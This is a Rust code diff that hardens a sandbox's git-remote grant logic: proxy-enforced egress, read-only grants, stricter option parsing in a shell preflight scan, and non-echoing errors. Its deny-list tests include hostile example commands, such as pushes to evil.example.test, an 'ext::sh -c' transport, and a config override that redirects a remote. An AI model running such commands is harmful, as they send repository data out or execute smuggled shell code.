@@ -6,22 +6,19 @@
 //! tenant's allowed remotes, never a credential value.
 //!
 //! Transport rules:
-//! - `file` remotes are virtual `/workspace/...` paths. They are checked to
-//!   canonicalize inside the call's own workspace and work in every egress
-//!   mode because they never leave the container.
-//! - `http`/`https` remotes need the daemon's validating egress proxy
-//!   (`proxy-enforced`, or the legacy advisory `proxy`). `none` and `tunnel`
-//!   are refused: the grant fails closed where the host cannot prove the
-//!   remote is reachable only through the allowlist.
+//! - `file` remotes are virtual `/workspace/...` paths that must initially
+//!   resolve inside the call's own workspace. They need no egress.
+//! - `http`/`https` remotes require `proxy-enforced`. The per-call proxy
+//!   restricts egress to selected hosts already on the tenant allowlist.
 //!
 //! Nothing in this module carries a credential. URLs with embedded userinfo
 //! are refused at parse time, the container environment contains only remote
 //! URLs and git hardening switches, and the evidence record contains names,
 //! transports, hosts and operation classes only.
 //!
-//! The shell command check is defense in depth and an early, explicit
-//! `capability_denied`. The security boundary stays host-side: the container
-//! holds no credential, and the proxy allowlist limits where egress can go.
+//! The manifest shell scan is best-effort preflight, not Git authorization:
+//! it does not control repository paths or Git operations on allowed hosts.
+//! This slice grants no hosted credentials or push capability.
 
 use std::path::{Path, PathBuf};
 
@@ -29,6 +26,7 @@ use serde::{Deserialize, Serialize};
 
 use crate::sandbox::config::SandboxNetworkMode;
 use crate::sandbox::error::{Result, SandboxError};
+use crate::sandbox::proxy::allowlist::{DomainAllowlist, extract_host};
 
 /// The reserved manifest extension that expresses a git remote grant request.
 pub const GIT_REMOTE_EXTENSION: &str = "git-remotes";
@@ -44,7 +42,6 @@ const MAX_URL_LEN: usize = 2048;
 #[serde(rename_all = "kebab-case")]
 pub enum GitOperationClass {
     Read,
-    Write,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
@@ -72,12 +69,6 @@ pub struct GitRemote {
     pub canonical: String,
 }
 
-impl GitRemote {
-    fn operations(&self) -> Vec<GitOperationClass> {
-        vec![GitOperationClass::Read, GitOperationClass::Write]
-    }
-}
-
 /// Host configuration parsed from `SANDBOX_GIT_REMOTES`.
 #[derive(Debug, Clone, Default, PartialEq, Eq)]
 pub struct GitGrantConfig {
@@ -96,26 +87,25 @@ impl GitGrantConfig {
             return Ok(None);
         }
         let mut remotes = Vec::new();
-        for entry in spec.split(',') {
+        for (index, entry) in spec.split(',').enumerate() {
             let entry = entry.trim();
             if entry.is_empty() {
                 continue;
             }
-            let (name, url) = entry
-                .split_once('=')
-                .ok_or_else(|| format!("SANDBOX_GIT_REMOTES entry '{entry}' must be name=url"))?;
+            let (name, url) = entry.split_once('=').ok_or_else(|| {
+                format!("SANDBOX_GIT_REMOTES entry {} must be name=url", index + 1)
+            })?;
             let name = name.trim();
             let url = url.trim();
             if name.is_empty() || url.is_empty() {
                 return Err(format!(
-                    "SANDBOX_GIT_REMOTES entry '{entry}' must have a non-empty name and url"
+                    "SANDBOX_GIT_REMOTES entry {} must have a non-empty name and URL",
+                    index + 1
                 ));
             }
             validate_remote_name(name)?;
             if remotes.iter().any(|remote: &GitRemote| remote.name == name) {
-                return Err(format!(
-                    "SANDBOX_GIT_REMOTES names must be unique; '{name}' appears twice"
-                ));
+                return Err("SANDBOX_GIT_REMOTES names must be unique".into());
             }
             if remotes.len() >= MAX_GIT_REMOTES {
                 return Err(format!(
@@ -168,6 +158,28 @@ pub struct EffectiveGitRemote {
 }
 
 impl GitGrantAuthorization {
+    /// Project the tenant ACL onto the exact hosts selected for this call.
+    /// Never enable a domain just because it occurs in a configured remote.
+    pub(super) fn proxy_hosts(&self, base_allowlist: &[String]) -> Result<Vec<String>> {
+        let allowlist = DomainAllowlist::new(base_allowlist);
+        let mut hosts = Vec::new();
+        for host in self
+            .remotes
+            .iter()
+            .filter_map(|remote| remote.host.as_ref())
+        {
+            if !allowlist.is_allowed(host).is_allowed() {
+                return Err(denied(
+                    "selected git remote host is outside the sandbox egress allowlist",
+                ));
+            }
+            if !hosts.contains(host) {
+                hosts.push(host.clone());
+            }
+        }
+        Ok(hosts)
+    }
+
     pub fn evidence(&self) -> EffectiveGitCapability {
         EffectiveGitCapability {
             grant: self.grant.clone(),
@@ -179,7 +191,7 @@ impl GitGrantAuthorization {
                     name: remote.name.clone(),
                     transport: remote.transport,
                     host: remote.host.clone(),
-                    operations: remote.operations(),
+                    operations: vec![GitOperationClass::Read],
                 })
                 .collect(),
         }
@@ -257,40 +269,27 @@ pub fn authorize_grant(
         }
         selected
     };
-    if selected.iter().any(|remote| remote.transport.is_network()) {
-        match network {
-            SandboxNetworkMode::ProxyEnforced => {}
-            SandboxNetworkMode::Proxy => {
-                tracing::warn!(
-                    "git remotes are granted under legacy advisory proxy mode; \
-                     egress enforcement is not kernel-level"
-                );
-            }
-            SandboxNetworkMode::None => {
-                return Err(denied(
-                    "network git remotes need the validating egress proxy; \
-                     network.mode=none cannot carry them",
-                ));
-            }
-            SandboxNetworkMode::Tunnel => {
-                return Err(denied(
-                    "network git remotes are not supported under network.mode=tunnel; \
-                     request proxy-enforced or grant file remotes only",
-                ));
-            }
-        }
+    let needs_proxy = selected.iter().any(|remote| remote.transport.is_network());
+    if network == SandboxNetworkMode::Proxy {
+        return Err(denied(
+            "git-remotes is not supported in advisory proxy mode",
+        ));
+    }
+    if needs_proxy && network != SandboxNetworkMode::ProxyEnforced {
+        return Err(denied(
+            "HTTP(S) git remotes require network.mode=proxy-enforced",
+        ));
     }
     for remote in &selected {
         if remote.transport == GitTransport::File {
             validate_file_remote(remote, cwd)?;
         }
     }
-    let egress = if selected.iter().any(|remote| remote.transport.is_network()) {
-        vec![SandboxNetworkMode::ProxyEnforced, SandboxNetworkMode::Proxy]
+    let egress = if needs_proxy {
+        vec![SandboxNetworkMode::ProxyEnforced]
     } else {
         vec![
             SandboxNetworkMode::ProxyEnforced,
-            SandboxNetworkMode::Proxy,
             SandboxNetworkMode::Tunnel,
             SandboxNetworkMode::None,
         ]
@@ -338,14 +337,20 @@ fn validate_file_remote(remote: &GitRemote, cwd: &Path) -> Result<()> {
     Ok(())
 }
 
-/// Validate a shell command against the effective git grant.
-///
-/// Callers pass `None` when the manifest did not request the grant. Any git
-/// network operation is then refused with `capability_denied`, matching the
-/// deny-by-default contract. Non-network git commands are untouched.
-pub fn authorize_shell_command(command: &str, grant: Option<&GitGrantAuthorization>) -> Result<()> {
+/// Check recognizable Git invocations before running a declared manifest.
+/// This scan cannot mediate commands constructed at runtime or repository
+/// configuration. Egress isolation is independent of the scan.
+pub(super) fn authorize_shell_command(
+    command: &str,
+    grant: Option<&GitGrantAuthorization>,
+    network: SandboxNetworkMode,
+) -> Result<()> {
+    let preflight = Preflight {
+        grant,
+        offline: network == SandboxNetworkMode::None,
+    };
     for simple in tokenize_simple_commands(command) {
-        scan_simple_command(&simple, grant, 0)?;
+        scan_simple_command(&simple, preflight, 0)?;
     }
     Ok(())
 }
@@ -369,10 +374,11 @@ fn validate_remote_name(name: &str) -> std::result::Result<(), String> {
     if valid {
         Ok(())
     } else {
-        Err(format!(
-            "SANDBOX_GIT_REMOTES remote name '{name}' must be 1-128 lowercase ASCII letters, \
+        Err(
+            "SANDBOX_GIT_REMOTES remote names must be 1-128 lowercase ASCII letters, \
              digits, '.', '_' or '-'"
-        ))
+                .into(),
+        )
     }
 }
 
@@ -395,26 +401,24 @@ fn parse_remote_url(raw: &str) -> std::result::Result<ParsedRemoteUrl, String> {
         );
     }
     if raw.contains('@') {
-        return Err(format!(
-            "SANDBOX_GIT_REMOTES URL '{raw}' must not embed credentials or a userinfo component"
-        ));
+        return Err("SANDBOX_GIT_REMOTES URLs must not embed credentials or userinfo".into());
     }
     let (scheme, rest) = raw
         .split_once("://")
-        .ok_or_else(|| format!("SANDBOX_GIT_REMOTES URL '{raw}' must be an absolute URL"))?;
+        .ok_or("SANDBOX_GIT_REMOTES requires absolute remote URLs")?;
     let scheme = scheme.to_ascii_lowercase();
     if rest.contains('?') || rest.contains('#') {
-        return Err(format!(
-            "SANDBOX_GIT_REMOTES URL '{raw}' must not carry a query or fragment"
-        ));
+        return Err("SANDBOX_GIT_REMOTES URLs must not carry a query or fragment".into());
     }
     match scheme.as_str() {
         "https" | "http" => {
             let (authority, path) = rest.split_once('/').unwrap_or((rest, ""));
-            if authority.is_empty() {
-                return Err(format!("SANDBOX_GIT_REMOTES URL '{raw}' has no host"));
+            if authority.is_empty() || raw.contains('\\') {
+                return Err("SANDBOX_GIT_REMOTES contains an invalid HTTP(S) URL".into());
             }
-            let authority = authority.to_ascii_lowercase();
+            let host = extract_host(raw)
+                .filter(|host| !host.contains('*'))
+                .ok_or("SANDBOX_GIT_REMOTES requires a valid, literal HTTP(S) host")?;
             let transport = if scheme == "https" {
                 GitTransport::Https
             } else {
@@ -422,17 +426,19 @@ fn parse_remote_url(raw: &str) -> std::result::Result<ParsedRemoteUrl, String> {
             };
             Ok(ParsedRemoteUrl {
                 transport,
-                host: Some(authority.clone()),
-                canonical: format!("{scheme}://{authority}/{path}"),
+                host: Some(host),
+                canonical: format!("{scheme}://{}/{path}", authority.to_ascii_lowercase()),
             })
         }
         "file" => {
-            let relative = rest.strip_prefix("/workspace/").ok_or_else(|| {
-                format!(
-                    "SANDBOX_GIT_REMOTES file URL '{raw}' must be under the virtual /workspace \
-                     path, e.g. file:///workspace/remotes/origin.git"
-                )
-            })?;
+            let relative = rest
+                .strip_prefix("/workspace/")
+                .ok_or("SANDBOX_GIT_REMOTES file URLs must be under the virtual /workspace path")?;
+            if relative.contains(['%', '\\']) {
+                return Err(
+                    "SANDBOX_GIT_REMOTES file URLs must use literal workspace paths".into(),
+                );
+            }
             validate_virtual_relative_path(relative)?;
             Ok(ParsedRemoteUrl {
                 transport: GitTransport::File,
@@ -440,9 +446,7 @@ fn parse_remote_url(raw: &str) -> std::result::Result<ParsedRemoteUrl, String> {
                 canonical: format!("file:///workspace/{relative}"),
             })
         }
-        other => Err(format!(
-            "SANDBOX_GIT_REMOTES scheme '{other}' is not supported; use https, http, or file"
-        )),
+        _ => Err("SANDBOX_GIT_REMOTES supports only https, http, or file URLs".into()),
     }
 }
 
@@ -452,10 +456,10 @@ fn validate_virtual_relative_path(relative: &str) -> std::result::Result<(), Str
     }
     for component in relative.split('/') {
         if component.is_empty() || component == "." || component == ".." {
-            return Err(format!(
-                "SANDBOX_GIT_REMOTES file path '{relative}' must not contain empty, '.' or '..' \
-                 components"
-            ));
+            return Err(
+                "SANDBOX_GIT_REMOTES file paths must not contain empty, '.' or '..' components"
+                    .into(),
+            );
         }
     }
     Ok(())
@@ -469,6 +473,36 @@ fn validate_virtual_relative_path(relative: &str) -> std::result::Result<(), Str
 struct Word {
     text: String,
     dynamic: bool,
+}
+
+#[derive(Clone, Copy)]
+struct Preflight<'a> {
+    grant: Option<&'a GitGrantAuthorization>,
+    offline: bool,
+}
+
+impl Preflight<'_> {
+    fn allows_local_read(self) -> bool {
+        self.grant.is_none() && self.offline
+    }
+
+    fn read_remote(self, word: &Word) -> Result<()> {
+        if self.allows_local_read() && !word.dynamic && is_explicit_local_path(&word.text) {
+            return Ok(());
+        }
+        authorize_url_or_name(word, self.grant)
+    }
+}
+
+fn is_explicit_local_path(raw: &str) -> bool {
+    raw == "."
+        || ["./", "/workspace/", "file:///workspace/"]
+            .iter()
+            .any(|prefix| {
+                raw.strip_prefix(prefix).is_some_and(|path| {
+                    !path.contains(':') && validate_virtual_relative_path(path).is_ok()
+                })
+            })
 }
 
 /// Split a shell command into simple commands. Quote-aware; command
@@ -579,11 +613,7 @@ fn basename(word: &str) -> &str {
     word.rsplit('/').next().unwrap_or(word)
 }
 
-fn scan_simple_command(
-    words: &[Word],
-    grant: Option<&GitGrantAuthorization>,
-    depth: usize,
-) -> Result<()> {
+fn scan_simple_command(words: &[Word], preflight: Preflight<'_>, depth: usize) -> Result<()> {
     if depth > 4 {
         return Err(denied(
             "nested shell command is too deep to authorize statically",
@@ -624,9 +654,9 @@ fn scan_simple_command(
                 index = skip_sudo_options(words, index);
             }
             "sh" | "bash" | "dash" | "zsh" | "ash" | "ksh" => {
-                return scan_shell_c(words, index, grant, depth);
+                return scan_shell_c(words, index, preflight, depth);
             }
-            "git" => return inspect_git_command(&words[index..], grant),
+            "git" => return inspect_git_command(&words[index..], preflight),
             _ => return Ok(()),
         }
     }
@@ -668,7 +698,7 @@ fn skip_sudo_options(words: &[Word], mut index: usize) -> usize {
 fn scan_shell_c(
     words: &[Word],
     index: usize,
-    grant: Option<&GitGrantAuthorization>,
+    preflight: Preflight<'_>,
     depth: usize,
 ) -> Result<()> {
     let mut cursor = index + 1;
@@ -685,7 +715,7 @@ fn scan_shell_c(
                 ));
             }
             for simple in tokenize_simple_commands(&script.text) {
-                scan_simple_command(&simple, grant, depth + 1)?;
+                scan_simple_command(&simple, preflight, depth + 1)?;
             }
             return Ok(());
         }
@@ -738,9 +768,9 @@ fn refuse_redirecting_config(overrides: &[String]) -> Result<()> {
             .iter()
             .any(|prefix| key == **prefix || key.starts_with(prefix))
         {
-            return Err(denied(format!(
-                "git configuration override '{key}' could redirect a granted remote; it is not permitted"
-            )));
+            return Err(denied(
+                "git configuration overrides that can redirect a granted remote are not permitted",
+            ));
         }
     }
     Ok(())
@@ -777,7 +807,7 @@ fn git_subcommand(words: &[Word]) -> std::result::Result<Option<usize>, SandboxE
     Ok(None)
 }
 
-fn inspect_git_command(words: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
+fn inspect_git_command(words: &[Word], preflight: Preflight<'_>) -> Result<()> {
     let Some(sub_index) = git_subcommand(words)? else {
         return Ok(());
     };
@@ -787,126 +817,117 @@ fn inspect_git_command(words: &[Word], grant: Option<&GitGrantAuthorization>) ->
     }
     let args = &words[sub_index + 1..];
     match sub.text.as_str() {
-        "clone" => authorize_clone(args, grant),
-        "fetch" | "pull" => authorize_fetch(args, grant),
-        "push" => authorize_push(args, grant),
+        "clone" => authorize_clone(args, preflight),
+        "fetch" | "pull" => authorize_fetch(args, preflight),
+        // Even a plain push can use config-selected destinations and refspecs.
+        // Do not try to authorize writes from an untrusted shell's text.
+        "push" => Err(denied(
+            "git push is not supported by manifest Git preflight",
+        )),
         "ls-remote" => {
-            let positional = positionals(args, &[]);
+            let positional = read_positionals(
+                args,
+                &[
+                    "-q",
+                    "--quiet",
+                    "--heads",
+                    "--branches",
+                    "--tags",
+                    "--refs",
+                    "--exit-code",
+                    "--symref",
+                ],
+                &["--sort"],
+            )?;
             let Some(remote) = positional.first() else {
-                return Ok(());
+                return if preflight.allows_local_read() {
+                    Ok(())
+                } else {
+                    Err(denied("name an explicit granted remote for ls-remote"))
+                };
             };
-            authorize_remote_arg(remote, grant)
+            preflight.read_remote(remote)
         }
-        "remote" => authorize_remote_subcommand(args, grant),
-        "archive" => authorize_archive(args, grant),
-        "submodule" => authorize_submodule(args, grant),
+        "remote" => authorize_remote_subcommand(args, preflight),
+        "archive" => authorize_archive(args, preflight),
+        "submodule" => authorize_submodule(args, preflight),
         _ => Ok(()),
     }
 }
 
-fn authorize_clone(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
-    const VALUE_OPTIONS: &[&str] = &[
-        "-b",
-        "--branch",
-        "--depth",
-        "-o",
-        "--origin",
-        "-c",
-        "--config",
-        "--reference",
-        "--reference-if-able",
-        "--separate-git-dir",
-        "--template",
-        "-j",
-        "--jobs",
-        "--upload-pack",
-        "--filter",
-        "--server-option",
-        "--shallow-since",
-        "--shallow-exclude",
-        "-u",
-    ];
-    let positional = positionals(args, VALUE_OPTIONS);
+fn authorize_clone(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
+    // Only options that leave the literal clone source visible here. In
+    // particular, clone's configuration options are not global Git options.
+    let positional = read_positionals(
+        args,
+        &[
+            "-q",
+            "--quiet",
+            "-v",
+            "--verbose",
+            "-n",
+            "--no-checkout",
+            "--bare",
+            "--no-hardlinks",
+            "--local",
+            "--no-local",
+            "--single-branch",
+            "--no-single-branch",
+            "--no-tags",
+            "--progress",
+            "--no-progress",
+        ],
+        &[
+            "-b",
+            "--branch",
+            "--depth",
+            "-o",
+            "--origin",
+            "--filter",
+            "--shallow-since",
+            "--shallow-exclude",
+        ],
+    )?;
     let Some(remote) = positional.first() else {
         return Ok(());
     };
-    authorize_remote_arg(remote, grant)
+    preflight.read_remote(remote)
 }
 
-fn authorize_fetch(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
-    if args.iter().any(|arg| {
-        arg.text == "--all" || arg.text == "--multiple" || arg.text.starts_with("--all=")
-    }) {
-        return Err(denied(
-            "fetch/pull --all or --multiple would reach every configured remote; name one granted remote",
-        ));
-    }
-    let positional = positionals(
+fn authorize_fetch(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
+    let positional = read_positionals(
         args,
         &[
-            "--depth",
-            "--upload-pack",
-            "--deepen",
-            "-j",
-            "--jobs",
-            "--refmap",
+            "-q",
+            "--quiet",
+            "-v",
+            "--verbose",
+            "--ff",
+            "--ff-only",
+            "--no-rebase",
+            "--rebase",
+            "--no-tags",
+            "--tags",
+            "--progress",
+            "--no-progress",
+            "--prune",
+            "--unshallow",
+            "--no-recurse-submodules",
         ],
-    );
+        &[
+            "--depth", "--deepen", "-j", "--jobs", "--refmap", "--filter",
+        ],
+    )?;
     match positional.first() {
-        Some(remote) => authorize_remote_arg(remote, grant),
-        None => authorize_remote_name("origin", grant),
+        Some(remote) => preflight.read_remote(remote),
+        // Only a network-disabled call can safely leave the choice of a
+        // local fetch/pull source to Git without a grant.
+        None if preflight.allows_local_read() => Ok(()),
+        None => Err(denied("name an explicit granted remote for fetch or pull")),
     }
 }
 
-fn authorize_push(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
-    for arg in args {
-        if is_force_or_delete_flag(&arg.text) {
-            return Err(denied(format!(
-                "git push option '{}' is not permitted; force pushes and remote ref deletion are refused",
-                arg.text
-            )));
-        }
-    }
-    let positional = positionals(
-        args,
-        &["-o", "--push-option", "--repo", "--receive-pack", "--exec"],
-    );
-    let Some(remote) = positional.first() else {
-        return authorize_remote_name("origin", grant);
-    };
-    authorize_remote_arg(remote, grant)?;
-    for refspec in positional.iter().skip(1) {
-        if refspec.dynamic {
-            return Err(denied("dynamic push refspec cannot be authorized"));
-        }
-        if refspec.text.starts_with('+') {
-            return Err(denied(
-                "force-push refspecs (leading '+') are not permitted",
-            ));
-        }
-        if refspec.text.starts_with(':') {
-            return Err(denied("remote ref deletion (leading ':') is not permitted"));
-        }
-    }
-    Ok(())
-}
-
-fn is_force_or_delete_flag(word: &str) -> bool {
-    matches!(
-        word,
-        "-f" | "--force"
-            | "--force-with-lease"
-            | "--force-if-includes"
-            | "--mirror"
-            | "--delete"
-            | "-d"
-            | "--prune"
-            | "--prune-tags"
-    ) || word.starts_with("--force-with-lease=")
-        || word.starts_with("--force-if-includes=")
-}
-
-fn authorize_remote_subcommand(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
+fn authorize_remote_subcommand(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
     let Some(action) = args.first() else {
         return Ok(());
     };
@@ -919,7 +940,7 @@ fn authorize_remote_subcommand(args: &[Word], grant: Option<&GitGrantAuthorizati
             let Some(url) = positional.get(1) else {
                 return Ok(());
             };
-            authorize_url_or_name(url, grant)
+            preflight.read_remote(url)
         }
         "update" => Err(denied(
             "git remote update reaches every configured remote; fetch a granted remote by name",
@@ -928,23 +949,26 @@ fn authorize_remote_subcommand(args: &[Word], grant: Option<&GitGrantAuthorizati
     }
 }
 
-fn authorize_archive(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
+fn authorize_archive(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
     let Some(flag) = args
         .iter()
-        .position(|word| word.text == "--remote" || word.text == "--remote=")
+        .position(|word| word.text == "--remote" || word.text.starts_with("--remote="))
     else {
         return Ok(());
     };
-    if args[flag].text == "--remote=" {
-        return Err(denied("archive --remote= needs a granted remote value"));
+    if let Some(value) = args[flag].text.strip_prefix("--remote=") {
+        return preflight.read_remote(&Word {
+            text: value.into(),
+            dynamic: args[flag].dynamic,
+        });
     }
     match args.get(flag + 1) {
-        Some(remote) => authorize_remote_arg(remote, grant),
+        Some(remote) => preflight.read_remote(remote),
         None => Err(denied("archive --remote needs a granted remote value")),
     }
 }
 
-fn authorize_submodule(args: &[Word], grant: Option<&GitGrantAuthorization>) -> Result<()> {
+fn authorize_submodule(args: &[Word], preflight: Preflight<'_>) -> Result<()> {
     if args.first().is_none_or(|word| word.text != "add") {
         return Ok(());
     }
@@ -955,47 +979,60 @@ fn authorize_submodule(args: &[Word], grant: Option<&GitGrantAuthorization>) -> 
     let Some(url) = positional.first() else {
         return Ok(());
     };
-    authorize_url_or_name(url, grant)
+    preflight.read_remote(url)
 }
 
-/// Positional arguments, skipping options and the values of `value_options`.
-fn positionals<'a>(words: &'a [Word], value_options: &[&str]) -> Vec<&'a Word> {
+/// Accept only known read options; do not guess the arity of an abbreviation,
+/// bundle, or unsupported option and then check the wrong argument as remote.
+fn read_positionals<'a>(
+    words: &'a [Word],
+    flags: &[&str],
+    value_options: &[&str],
+) -> Result<Vec<&'a Word>> {
     let mut result = Vec::new();
     let mut index = 0;
     let mut end_of_options = false;
     while index < words.len() {
-        let word = &words[index].text;
+        let arg = &words[index];
+        let word = arg.text.as_str();
+        if arg.dynamic {
+            return Err(denied(
+                "dynamic arguments cannot be authorized for this Git read",
+            ));
+        }
         if !end_of_options && word == "--" {
             end_of_options = true;
             index += 1;
             continue;
         }
         if !end_of_options && word.starts_with('-') && word != "-" {
-            let takes_value = value_options.contains(&word.as_str());
-            index += if takes_value { 2 } else { 1 };
+            if flags.contains(&word) {
+                index += 1;
+            } else if value_options.contains(&word) {
+                if words
+                    .get(index + 1)
+                    .is_none_or(|value| value.dynamic || value.text.starts_with('-'))
+                {
+                    return Err(denied("Git read option requires a literal value"));
+                }
+                index += 2;
+            } else if word.starts_with("--")
+                && word
+                    .split_once('=')
+                    .is_some_and(|(key, value)| value_options.contains(&key) && !value.is_empty())
+            {
+                index += 1;
+            } else {
+                return Err(denied(
+                    "unsupported option in manifest Git read; use full supported options",
+                ));
+            }
             continue;
         }
         result.push(&words[index]);
         index += 1;
     }
-    result
-}
-
-fn authorize_remote_arg(word: &Word, grant: Option<&GitGrantAuthorization>) -> Result<()> {
-    authorize_url_or_name(word, grant)
-}
-
-fn authorize_remote_name(name: &str, grant: Option<&GitGrantAuthorization>) -> Result<()> {
-    let Some(grant) = grant else {
-        return Err(no_grant_denial());
-    };
-    if grant.remote_by_name(name).is_some() {
-        Ok(())
-    } else {
-        Err(denied(format!(
-            "default remote '{name}' is not in this tenant's host git grant"
-        )))
-    }
+    Ok(result)
 }
 
 fn authorize_url_or_name(word: &Word, grant: Option<&GitGrantAuthorization>) -> Result<()> {
@@ -1018,10 +1055,7 @@ fn authorize_url_or_name(word: &Word, grant: Option<&GitGrantAuthorization>) -> 
     {
         Ok(())
     } else {
-        Err(denied(format!(
-            "git remote '{}' is not in this tenant's host git grant",
-            word.text
-        )))
+        Err(denied("git remote is not in this tenant's host git grant"))
     }
 }
 
@@ -1031,12 +1065,9 @@ fn canonicalize_command_url(raw: &str) -> Result<String> {
     }
     // A bare absolute /workspace path is the in-container spelling of a
     // granted `file:///workspace/...` remote.
-    let relative = raw.strip_prefix("/workspace/").ok_or_else(|| {
-        denied(format!(
-            "git remote '{raw}' is not a granted remote name or an absolute URL; \
-             relative and scp-style remotes are refused"
-        ))
-    })?;
+    let relative = raw
+        .strip_prefix("/workspace/")
+        .ok_or_else(|| denied("git remote must be a granted name or an absolute URL"))?;
     validate_virtual_relative_path(relative).map_err(denied)?;
     Ok(format!("file:///workspace/{relative}"))
 }
@@ -1051,8 +1082,6 @@ fn no_grant_denial() -> SandboxError {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use std::process::Command;
-    use std::sync::OnceLock;
 
     fn spec() -> GitGrantConfig {
         GitGrantConfig::from_spec(
@@ -1094,10 +1123,34 @@ mod tests {
             "origin=https://git.example.test/repo.git,origin=https://git.example.test/other.git",
             "origin=https://git.example.test/repo.git,upstream",
             "origin=ftp://git.example.test/repo.git",
+            "origin=https://*.example.test/repo.git",
+            "origin=https://git.example.test:invalid/repo.git",
         ] {
             assert!(GitGrantConfig::from_spec(bad).is_err(), "accepted {bad}");
         }
         assert!(GitGrantConfig::from_spec("  ").unwrap().is_none());
+    }
+
+    #[test]
+    fn invalid_configuration_never_echoes_supplied_values() {
+        const MARKER: &str = "redaction-marker";
+        for input in [
+            MARKER.to_owned(),
+            format!("{MARKER}="),
+            format!("origin=https://{MARKER}@git.example.test/repo.git"),
+            format!("origin=https://git.example.test/repo.git?label={MARKER}"),
+            format!("origin=https://git.example.test/repo.git#{MARKER}"),
+            format!("origin={MARKER}"),
+            format!("origin={MARKER}://git.example.test/repo.git"),
+            format!("origin=file:///workspace/{MARKER}/../repo.git"),
+        ] {
+            let error = GitGrantConfig::from_spec(&input).unwrap_err();
+            assert!(error.contains("SANDBOX_GIT_REMOTES"));
+            assert!(
+                !error.contains(MARKER),
+                "configuration error disclosed input"
+            );
+        }
     }
 
     #[test]
@@ -1106,13 +1159,22 @@ mod tests {
             GitGrantConfig::from_spec("upstream=https://git.example.test/org/repo.git")
                 .unwrap()
                 .unwrap();
-        for mode in [SandboxNetworkMode::None, SandboxNetworkMode::Tunnel] {
+        for mode in [
+            SandboxNetworkMode::None,
+            SandboxNetworkMode::Tunnel,
+            SandboxNetworkMode::Proxy,
+        ] {
             let error = authorize_grant(&network_only, &[], Path::new("/tmp"), mode).unwrap_err();
             assert!(error.to_string().contains("git-remotes"), "{error}");
         }
-        for mode in [SandboxNetworkMode::ProxyEnforced, SandboxNetworkMode::Proxy] {
-            assert!(authorize_grant(&network_only, &[], Path::new("/tmp"), mode).is_ok());
-        }
+        let grant = authorize_grant(
+            &network_only,
+            &[],
+            Path::new("/tmp"),
+            SandboxNetworkMode::ProxyEnforced,
+        )
+        .unwrap();
+        assert_eq!(grant.egress, [SandboxNetworkMode::ProxyEnforced]);
         let (temp, _) = workspace_with_remote();
         let cwd = temp.path().canonicalize().unwrap();
         let file_only = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
@@ -1123,8 +1185,10 @@ mod tests {
             SandboxNetworkMode::Tunnel,
             SandboxNetworkMode::ProxyEnforced,
         ] {
-            assert!(authorize_grant(&file_only, &[], &cwd, mode).is_ok());
+            let grant = authorize_grant(&file_only, &[], &cwd, mode).unwrap();
+            assert!(!grant.egress.contains(&SandboxNetworkMode::Proxy));
         }
+        assert!(authorize_grant(&file_only, &[], &cwd, SandboxNetworkMode::Proxy).is_err());
     }
 
     #[test]
@@ -1139,6 +1203,16 @@ mod tests {
         .unwrap();
         assert_eq!(grant.remotes.len(), 1);
         assert_eq!(grant.remotes[0].name, "upstream");
+        assert_eq!(
+            grant
+                .proxy_hosts(&["*.example.test".into(), "git.internal".into()])
+                .unwrap(),
+            ["git.example.test"]
+        );
+        assert!(matches!(
+            grant.proxy_hosts(&["git.internal".into()]),
+            Err(SandboxError::CapabilityDenied { .. })
+        ));
         let error = authorize_grant(
             &host,
             &["other-tenant".to_string()],
@@ -1218,7 +1292,7 @@ mod tests {
         assert_eq!(evidence.remotes[0].transport, GitTransport::File);
         assert_eq!(
             evidence.remotes[0].operations,
-            vec![GitOperationClass::Read, GitOperationClass::Write]
+            vec![GitOperationClass::Read]
         );
         let json = serde_json::to_string(&evidence).unwrap();
         assert!(json.contains("\"grant\":\"host:sandbox-git-remotes\""));
@@ -1227,7 +1301,7 @@ mod tests {
     }
 
     #[test]
-    fn without_a_grant_network_git_is_denied_and_local_git_is_untouched() {
+    fn offline_manifest_allows_ordinary_local_reads_without_a_grant() {
         for command in [
             "git clone https://git.example.test/org/repo.git",
             "git push origin main",
@@ -1237,7 +1311,8 @@ mod tests {
             "sh -c 'git pull origin main'",
             "env git fetch origin",
         ] {
-            let error = authorize_shell_command(command, None).unwrap_err();
+            let error =
+                authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap_err();
             assert!(
                 matches!(error, SandboxError::CapabilityDenied { .. }),
                 "{command}: {error}"
@@ -1248,11 +1323,25 @@ mod tests {
             "git log --oneline -5",
             "git commit -m 'message'",
             "git config --get remote.origin.url",
+            "git clone . copy",
+            "git clone -q ./repo copy",
+            "git fetch",
+            "git pull --ff-only",
             "cargo build",
             "echo git clone nope",
         ] {
-            authorize_shell_command(command, None).unwrap();
+            authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap();
         }
+        for command in ["git clone . copy", "git fetch", "git pull --ff-only"] {
+            assert!(matches!(
+                authorize_shell_command(command, None, SandboxNetworkMode::ProxyEnforced),
+                Err(SandboxError::CapabilityDenied { .. })
+            ));
+        }
+    }
+
+    fn check_granted(command: &str, grant: &GitGrantAuthorization) -> Result<()> {
+        authorize_shell_command(command, Some(grant), SandboxNetworkMode::ProxyEnforced)
     }
 
     #[test]
@@ -1263,11 +1352,10 @@ mod tests {
             "git clone /workspace/remotes/origin.git work",
             "git fetch origin",
             "git pull origin main",
-            "git push origin main",
             "git ls-remote origin",
             "git remote add backup file:///workspace/remotes/origin.git",
         ] {
-            authorize_shell_command(command, Some(&grant)).unwrap_or_else(|error| {
+            check_granted(command, &grant).unwrap_or_else(|error| {
                 panic!("{command}: {error}");
             });
         }
@@ -1278,6 +1366,7 @@ mod tests {
             "git push https://evil.example.test/repo.git main",
             "git push $REMOTE main",
             "git fetch --all",
+            "git fetch",
             "git remote update",
             "git clone ext::sh -c evil",
             "git -c remote.origin.url=https://evil.example.test/r.git push origin main",
